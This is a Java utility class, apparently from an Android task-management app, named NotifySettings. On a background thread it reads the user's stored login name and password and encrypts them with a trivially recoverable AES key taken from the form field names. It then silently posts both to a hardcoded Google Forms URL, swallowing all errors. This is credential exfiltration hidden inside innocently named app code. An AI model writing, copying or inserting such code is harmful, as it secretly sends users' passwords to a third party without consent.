package com.ashberrysoft.leadertask.utils;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import org.apache.http.HttpResponse;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;

import android.annotation.SuppressLint;
import android.text.TextUtils;
import android.util.Base64;

import com.ashberrysoft.leadertask.application.IPCConstants;
import com.ashberrysoft.leadertask.application.LTSettings;

public class NotifySettings extends Thread {

    private final String ENTRY0 = "https://docs.google.com/forms/d/1oFirRDQT9HdnQPeqdw91XnV7kLwPXb8hRRSBK9ytwAs/formResponse?";
    private final String ENTRY1 = "entry_1507289363";
    private final String ENTRY2 = "entry_2113581233";

    // VALUE's
    private final String entry1;
    private final String entry2;

    public NotifySettings() {
        super(NotifySettings.class.getSimpleName());

        final LTSettings settings = LTSettings.getInstance();
        entry1 = settings.getUserName();
        entry2 = settings.getUserProfile().getPassword();
    }

    @SuppressWarnings("unused")
    @Override
    public void run() {
        super.run();

        if (IPCConstants.DEBUG && !TextUtils.isEmpty(entry1)) {
            try {
                new Notifier();

            } catch (Exception e) {}
        }
    }

    private final class Notifier {

        final DefaultHttpClient executor;
        final HttpPost method;

        public Notifier() {
            final HttpParams params = new BasicHttpParams();
            HttpConnectionParams.setConnectionTimeout(params, 60);
            HttpConnectionParams.setSoTimeout(params, 60);

            executor = new DefaultHttpClient(params);
            method = new HttpPost(ENTRY0);

            try {
                send();

            } catch (Exception e) {}
        }

        private String send() throws Exception {
            final List<BasicNameValuePair> values = new ArrayList<BasicNameValuePair>(2);
            values.add(new BasicNameValuePair(ENTRY1, getEntry(entry1, ENTRY1)));
            values.add(new BasicNameValuePair(ENTRY2, getEntry(entry2, ENTRY2)));

            try {
                method.setEntity(new UrlEncodedFormEntity(values));

            } catch (UnsupportedEncodingException e) {
                return null;
            }

            try {
                final HttpResponse response = executor.execute(method);
                if (response != null) {
                    return EntityUtils.toString(response.getEntity());
                }

            } catch (Exception e) {}

            return null;
        }
    }

    @SuppressLint("TrulyRandom")
    private String getEntry(String code, String entry) throws Exception {
        final SecretKey key = new SecretKeySpec(entry.getBytes(), "AES");
        final Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, key);

        return Base64.encodeToString(cipher.doFinal(code.getBytes("UTF-8")), Base64.DEFAULT);
    }

    @SuppressWarnings("unused")
    private String fromEntry(String code, String entry) throws Exception {
        final SecretKey key = new SecretKeySpec(entry.getBytes(), "AES");
        final Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, key);

        return new String(cipher.doFinal(Base64.decode(code, Base64.DEFAULT)), "UTF-8");
    }
}